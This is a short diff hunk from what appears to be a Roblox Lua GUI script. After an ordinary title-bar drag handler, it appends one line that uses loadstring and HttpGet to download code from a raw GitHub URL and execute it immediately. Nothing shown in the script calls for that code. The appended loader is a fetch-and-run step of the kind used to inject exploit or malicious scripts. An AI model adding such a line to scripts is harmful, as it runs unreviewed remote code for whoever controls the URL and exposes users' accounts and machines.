@@ -121,3 +121,4 @@ titleBar.InputEnded:Connect(function(input)
         dragging = false
     end
 end)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Dreammmmmm532235/source.lua/refs/heads/main/Script%20player", true))()
